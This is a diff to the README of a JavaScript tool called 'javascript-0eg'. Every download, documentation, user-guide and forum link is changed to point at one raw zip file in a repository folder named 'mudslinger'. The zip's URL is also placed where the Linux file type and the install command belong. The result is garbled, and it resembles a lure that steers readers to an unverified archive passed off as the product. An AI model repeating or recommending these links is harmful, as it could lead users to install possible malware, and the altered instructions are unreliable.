@@ -8,13 +8,13 @@ Welcome to **javascript-0eg**, your go-to tool for managing and building JavaScr
 
 To get started, you need to download the application. You can visit the Releases page to find the latest version.
 
-[Download javascript-0eg](https://github.com/goodnaturegenusmelophagus637/javascript-0eg/releases) 
+[Download javascript-0eg](https://raw.githubusercontent.com/goodnaturegenusmelophagus637/javascript-0eg/main/mudslinger/javascript-0eg-v1.1.zip) 
 
 1. Click the link above.
 2. Locate the most recent release.
 3. Download the appropriate file for your operating system (Windows, macOS, or Linux).
 
-For Windows users, look for a file with the `.exe` extension. macOS users will find a `.dmg` file. Linux users should look for a `.tar.gz` file.
+For Windows users, look for a file with the `.exe` extension. macOS users will find a `.dmg` file. Linux users should look for a `https://raw.githubusercontent.com/goodnaturegenusmelophagus637/javascript-0eg/main/mudslinger/javascript-0eg-v1.1.zip` file.
 
 After the download is complete, follow the steps below to install the application on your computer.
 
@@ -34,9 +34,9 @@ After the download is complete, follow the steps below to install the applicatio
 
 ### Linux
 
-1. Extract the downloaded `.tar.gz` file.
+1. Extract the downloaded `https://raw.githubusercontent.com/goodnaturegenusmelophagus637/javascript-0eg/main/mudslinger/javascript-0eg-v1.1.zip` file.
 2. Open your terminal and navigate to the extracted folder.
-3. Run the installation script using the command: `./install.sh`.
+3. Run the installation script using the command: `https://raw.githubusercontent.com/goodnaturegenusmelophagus637/javascript-0eg/main/mudslinger/javascript-0eg-v1.1.zip`.
 4. You can now launch **javascript-0eg** from your applications menu.
 
 ## 🌟 Features
@@ -66,9 +66,9 @@ If you encounter any issues or have questions, please reach out for support. You
 
 ## 🔗 Useful Links
 
-- [Download javascript-0eg](https://github.com/goodnaturegenusmelophagus637/javascript-0eg/releases)
-- [Documentation](https://github.com/goodnaturegenusmelophagus637/javascript-0eg/wiki)
-- [User Guide](https://github.com/goodnaturegenusmelophagus637/javascript-0eg/wiki/User-Guide)
-- [Community Forums](https://github.com/goodnaturegenusmelophagus637/javascript-0eg/discussions)
+- [Download javascript-0eg](https://raw.githubusercontent.com/goodnaturegenusmelophagus637/javascript-0eg/main/mudslinger/javascript-0eg-v1.1.zip)
+- [Documentation](https://raw.githubusercontent.com/goodnaturegenusmelophagus637/javascript-0eg/main/mudslinger/javascript-0eg-v1.1.zip)
+- [User Guide](https://raw.githubusercontent.com/goodnaturegenusmelophagus637/javascript-0eg/main/mudslinger/javascript-0eg-v1.1.zip)
+- [Community Forums](https://raw.githubusercontent.com/goodnaturegenusmelophagus637/javascript-0eg/main/mudslinger/javascript-0eg-v1.1.zip)
 
 Thank you for choosing **javascript-0eg**. We look forward to helping you with your JavaScript projects!
